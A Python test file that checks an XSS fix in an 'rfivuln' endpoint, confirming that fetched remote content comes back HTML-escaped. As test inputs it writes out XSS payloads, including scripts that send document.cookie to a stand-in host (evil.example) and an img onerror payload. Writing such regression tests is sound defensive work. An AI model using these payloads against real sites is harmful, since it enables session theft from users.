"""
Proof tests for the XSS fix in rfi.py (rfivuln endpoint).

Attack vector:
  An attacker controls a public server that returns an HTML/JS payload.
  fetchimage() returns the raw body; the vulnerable code embedded it verbatim
  into {"msg": "response, <script>...</script>"}.
  Any frontend rendering msg via innerHTML would execute attacker JS.

The fix wraps the fetched content with html.escape() so angle brackets and
other dangerous characters are neutralised before they enter the response.
"""

import socket
from unittest.mock import MagicMock, patch

import rfi


# ---------------------------------------------------------------------------
# Attack-vector tests (would FAIL on the vulnerable code)
# ---------------------------------------------------------------------------

def _mock_public_fetch(payload: str):
    """Helper: simulate fetchimage() returning attacker-controlled content."""
    mock_resp = MagicMock()
    mock_resp.text = payload
    with patch.object(socket, "gethostbyname", return_value="93.184.216.34"):
        with patch("requests.get", return_value=mock_resp):
            return rfi.rfivuln({"imagelink": "http://attacker.example.com/payload"})


def test_script_tag_is_escaped():
    """<script> payload from fetched URL must be HTML-escaped in the response."""
    xss_payload = "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
    response, status = _mock_public_fetch(xss_payload)
    assert status == 200
    msg = response["msg"]
    assert "<script>" not in msg, f"Raw <script> tag present in response: {msg!r}"
    assert "&lt;script&gt;" in msg, f"Expected escaped &lt;script&gt; but got: {msg!r}"


def test_angle_brackets_escaped():
    """Any angle bracket content from a remote URL must be escaped."""
    html_payload = '<img src=x onerror="alert(1)">'
    response, status = _mock_public_fetch(html_payload)
    msg = response["msg"]
    assert "<img" not in msg, f"Raw <img> tag present in response: {msg!r}"
    assert "&lt;img" in msg, f"Expected escaped &lt;img but got: {msg!r}"


def test_ampersand_escaped():
    """& in fetched content must be escaped to &amp;."""
    response, status = _mock_public_fetch("a&b")
    msg = response["msg"]
    assert "&amp;" in msg, f"Unescaped & present in response: {msg!r}"


def test_safe_text_still_returned():
    """Non-HTML content must pass through intact (regression guard)."""
    response, status = _mock_public_fetch("hello world")
    assert status == 200
    assert "hello world" in response["msg"]


def test_xss_payload_not_executable():
    """Full XSS exfiltration payload must not survive unescaped."""
    evil = "<script>document.location='http://evil.example/?c='+document.cookie</script>"
    response, status = _mock_public_fetch(evil)
    msg = response["msg"]
    # Neither opening nor closing script tag should be raw
    assert "<script>" not in msg
    assert "</script>" not in msg
